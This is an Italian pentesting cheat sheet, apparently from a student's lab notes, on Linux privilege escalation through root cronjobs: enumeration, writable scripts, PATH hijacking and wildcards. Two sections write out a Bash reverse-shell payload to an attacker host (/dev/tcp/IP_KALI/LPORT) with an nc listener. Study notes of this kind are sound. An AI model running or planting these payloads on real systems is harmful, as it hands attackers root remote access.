#Privesc_Linux

---
---
---
#### INDICE
- [[#Introduzione]]
- [[#Enumerazione]]
- [[#Script Cronjob Modificabile]]
- [[#Variabile `PATH`]]
- [[#Wildcard `*`]]

---
---
---
### Introduzione
I **cronjob** eseguiti con privilegi `root` rappresentano un ottimo vettore di privilege escalation, specialmente se combinati con errori di configurazione comuni.
Utilizziamo il tool [pspy64s]() per identificare i processi iterativi sulla macchina od in alternativa visioniamo il file `/etc/crontab`:

```
# â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ minute (0 - 59)
# â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ hour (0 - 23)
# â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ day of the month (1 - 31)
# â”‚ â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ month (1 - 12)
# â”‚ â”‚ â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ day of the week (0 - 6) (Sunday to Saturday)
# â”‚ â”‚ â”‚ â”‚ â”‚                                   OR sun, mon, tue, wed, thu, fri, sat
# â”‚ â”‚ â”‚ â”‚ â”‚
# â”‚ â”‚ â”‚ â”‚ â”‚
# * * * * * username cronjob.sh
```

---
### Enumerazione
Verifica la presenza di job pianificati:

```
cat /etc/crontab
cat /etc/cron.d
```

Trova processi iterativi nascosti:

```
./pspy64s.sh
```

---
### Script Cronjob Modificabile
Se lo script eseguito dal cronjob Ã¨ **modificabile**, puoi sostituirlo con un payload malevolo:

```
echo -e "#!/bin/bash" > cronjob.sh
echo "bash -i >& /dev/tcp/IP_KALI/LPORT 0>&1" >> cronjob.sh

#Porta in ascolto
nc -lvnp LPORT    
```

Quando il cronjob verrÃ  eseguito (ogni minuto, tipicamente), avvierÃ  la **reverse shell con privilegi root.**

ðŸ“šâ€‹ Writeups:
- *Linux:*[[Linux#Cronos| Cronos]],[[Linux#Bashed| Bashed]],[[Linux#Thompson| Thompson]],[[Linux#Nineveh| Nineveh]],[[Linux#Node| Node]],[[Linux#Sync| Sync]],
- *Network:*[[Network#OSCP Challenge C | Challenge C]],

---
### Variabile `PATH`
Se nel file `/etc/crontab` la variabile[[ðŸ”¡ Glossario#Variabili Globali| PATHÂ°]] include directory sovrascrivibili dall'utente attuale, allora Ã¨ possibile creare un secondo file con lo stesso nome poichÃ© il `crontab` lo cercherÃ  prima lÃ¬.

Ad esempio se abbiamo:

```
PATH=/home/user:/usr/bin:/bin   #il primo percorso su cui cerca Ã¨ /home/user
```

```
* * * * * root cronjob.sh
```

Puoi creare uno **script `cronjob.sh` malevolo** nella tua home directory:

```
echo -e "#!/bin/bash" > cronjob.sh
echo "bash -i >& /dev/tcp/IP_KALI/LPORT 0>&1" >> cronjob.sh
nc -lvnp LPORT    #Porta in ascolto
chmod +x cronjob.sh
```

Quando il cronjob esegue `cronjob.sh`, userÃ  **il tuo script** grazie alla manipolazione della variabile [[ðŸ”¡ Glossario#Variabili Globali| PATHÂ°]].

---
### Wildcard `*`
Se un cronjob esegue un comando con `*` allora Ã¨ possibile sfruttare quel comando per eseguire un privilege escalation. Per approfondimenti consultare la sezione[[SUDO#Wildcard (`*`)| Permessi SUDO]] e [[SUID]].

ðŸ“šâ€‹ Writeups:
- [[Linux#CmesS| CmesS]],[[Linux#Readys| Readys]],[[Linux#Amaterasu| Amaterasu]],
